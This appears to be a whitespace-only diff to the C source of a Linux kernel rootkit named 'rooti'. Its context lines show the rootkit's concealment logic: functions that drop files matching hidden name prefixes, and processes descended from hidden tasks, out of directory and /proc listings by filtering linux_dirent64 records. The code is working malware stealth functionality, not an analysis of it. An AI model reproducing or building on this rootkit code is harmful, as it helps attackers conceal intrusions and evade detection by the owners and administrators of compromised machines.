@@ -21,7 +21,7 @@ static bool rooti_should_hide_file_by_prefix(struct linux_dirent64 *record)
 {
     size_t filename_len = strlen(record->d_name);
     size_t prefix_len = 0;
-    
+
     for (int i = 0; i < ROOTI_HIDDEN_FILES_PREFIXES_COUNT; i++) {
         prefix_len = strlen(ROOTI_HIDDEN_FILES_PREFIXES[i]);
         if (filename_len >= prefix_len &&
@@ -82,7 +82,7 @@ static bool rooti_should_hide_proc(struct linux_dirent64 *record)
         ROOTI_DEBUG("find_vpid() failed");
         return false;
     }
-        
+
     task = pid_task(pid_struct, PIDTYPE_PID);
     if (task == NULL) {
         rcu_read_unlock();
@@ -95,9 +95,9 @@ static bool rooti_should_hide_proc(struct linux_dirent64 *record)
             rcu_read_unlock();
             return true;
         }
-        task = rcu_dereference(task->real_parent); 
+        task = rcu_dereference(task->real_parent);
     }
-    
+
     rcu_read_unlock();
     return false;
 #endif
@@ -123,7 +123,7 @@ static size_t rooti_filter_dir_entries(struct linux_dirent64 *records_buf, size_
     struct linux_dirent64 *curr_record = NULL;
     struct linux_dirent64 *prev_record = NULL;
     unsigned long offset = 0;
-    
+
     while (offset < count) {
         curr_record = (void *)records_buf + offset;
         if (rooti_should_hide_file(curr_record) || (is_proc_dir && rooti_should_hide_proc(curr_record))) {
